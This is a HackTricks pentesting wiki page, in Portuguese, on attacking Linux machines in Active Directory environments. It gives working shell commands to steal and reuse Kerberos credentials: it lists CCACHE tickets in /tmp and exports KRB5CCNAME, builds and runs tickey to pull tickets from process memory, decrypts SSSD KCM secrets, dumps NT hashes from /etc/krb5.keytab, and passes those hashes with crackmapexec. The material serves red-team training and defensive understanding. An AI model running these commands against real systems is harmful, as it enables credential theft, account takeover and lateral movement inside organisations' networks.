# Linux Active Directory

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

Uma máquina linux também pode estar presente dentro de um ambiente Active Directory.

Uma máquina linux em um AD pode estar **armazenando diferentes tickets CCACHE dentro de arquivos. Esses tickets podem ser usados e abusados como qualquer outro ticket kerberos**. Para ler esses tickets, você precisará ser o usuário proprietário do ticket ou **root** dentro da máquina.

## Enumeração

### Enumeração de AD a partir do linux

Se você tiver acesso a um AD no linux (ou bash no Windows), pode tentar [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) para enumerar o AD.

Você também pode verificar a seguinte página para aprender **outras maneiras de enumerar AD a partir do linux**:

{% content-ref url="../../network-services-pentesting/pentesting-ldap.md" %}
[pentesting-ldap.md](../../network-services-pentesting/pentesting-ldap.md)
{% endcontent-ref %}

### FreeIPA

FreeIPA é uma **alternativa** de código aberto ao **Active Directory** da Microsoft, principalmente para ambientes **Unix**. Ele combina um **diretório LDAP** completo com um Centro de Distribuição de Chaves **Kerberos** do MIT para gerenciamento semelhante ao Active Directory. Utilizando o **Sistema de Certificados Dogtag** para gerenciamento de certificados CA e RA, suporta autenticação **multifatorial**, incluindo cartões inteligentes. O SSSD está integrado para processos de autenticação Unix. Saiba mais sobre isso em:

{% content-ref url="../freeipa-pentesting.md" %}
[freeipa-pentesting.md](../freeipa-pentesting.md)
{% endcontent-ref %}

## Brincando com tickets

### Pass The Ticket

Nesta página, você encontrará diferentes lugares onde pode **encontrar tickets kerberos dentro de um host linux**, na página seguinte você pode aprender como transformar esses formatos de tickets CCache para Kirbi (o formato que você precisa usar no Windows) e também como realizar um ataque PTT:

{% content-ref url="../../windows-hardening/active-directory-methodology/pass-the-ticket.md" %}
[pass-the-ticket.md](../../windows-hardening/active-directory-methodology/pass-the-ticket.md)
{% endcontent-ref %}

### Reutilização de ticket CCACHE de /tmp

Os arquivos CCACHE são formatos binários para **armazenar credenciais Kerberos** e geralmente são armazenados com permissões 600 em `/tmp`. Esses arquivos podem ser identificados pelo seu **formato de nome, `krb5cc_%{uid}`,** correlacionando ao UID do usuário. Para verificação do ticket de autenticação, a **variável de ambiente `KRB5CCNAME`** deve ser definida para o caminho do arquivo de ticket desejado, permitindo sua reutilização.

Liste o ticket atual usado para autenticação com `env | grep KRB5CCNAME`. O formato é portátil e o ticket pode ser **reutilizado definindo a variável de ambiente** com `export KRB5CCNAME=/tmp/ticket.ccache`. O formato do nome do ticket Kerberos é `krb5cc_%{uid}` onde uid é o UID do usuário.
```bash
# Find tickets
ls /tmp/ | grep krb5cc
krb5cc_1000

# Prepare to use it
export KRB5CCNAME=/tmp/krb5cc_1000
```
### Reutilização de tickets CCACHE do keyring

**Tickets Kerberos armazenados na memória de um processo podem ser extraídos**, particularmente quando a proteção ptrace da máquina está desativada (`/proc/sys/kernel/yama/ptrace_scope`). Uma ferramenta útil para esse propósito pode ser encontrada em [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey), que facilita a extração injetando em sessões e despejando tickets em `/tmp`.

Para configurar e usar esta ferramenta, os passos abaixo são seguidos:
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
Este procedimento tentará injetar em várias sessões, indicando sucesso ao armazenar os tickets extraídos em `/tmp` com uma convenção de nomenclatura de `__krb_UID.ccache`.

### Reutilização de tickets CCACHE do SSSD KCM

O SSSD mantém uma cópia do banco de dados no caminho `/var/lib/sss/secrets/secrets.ldb`. A chave correspondente é armazenada como um arquivo oculto no caminho `/var/lib/sss/secrets/.secrets.mkey`. Por padrão, a chave só é legível se você tiver permissões de **root**.

Invocar \*\*`SSSDKCMExtractor` \*\* com os parâmetros --database e --key irá analisar o banco de dados e **descriptografar os segredos**.
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
O **blob de cache de credenciais Kerberos pode ser convertido em um arquivo CCache Kerberos utilizável** que pode ser passado para Mimikatz/Rubeus.

### Reutilização de ticket CCACHE a partir de keytab
```bash
git clone https://github.com/its-a-feature/KeytabParser
python KeytabParser.py /etc/krb5.keytab
klist -k /etc/krb5.keytab
```
### Extrair contas de /etc/krb5.keytab

As chaves de contas de serviço, essenciais para serviços que operam com privilégios de root, são armazenadas de forma segura nos arquivos **`/etc/krb5.keytab`**. Essas chaves, semelhantes a senhas para serviços, exigem estrita confidencialidade.

Para inspecionar o conteúdo do arquivo keytab, pode-se empregar **`klist`**. A ferramenta é projetada para exibir detalhes da chave, incluindo o **NT Hash** para autenticação de usuários, particularmente quando o tipo de chave é identificado como 23.
```bash
klist.exe -t -K -e -k FILE:C:/Path/to/your/krb5.keytab
# Output includes service principal details and the NT Hash
```
Para usuários do Linux, **`KeyTabExtract`** oferece funcionalidade para extrair o hash RC4 HMAC, que pode ser utilizado para reutilização do hash NTLM.
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
No macOS, **`bifrost`** serve como uma ferramenta para análise de arquivos keytab.
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
Utilizando as informações de conta e hash extraídas, conexões com servidores podem ser estabelecidas usando ferramentas como **`crackmapexec`**.
```bash
crackmapexec 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"
```
## Referências
* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)
* [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#linux-active-directory)

<figure><img src="/..https:/pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para o** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.

</details>
{% endhint %}
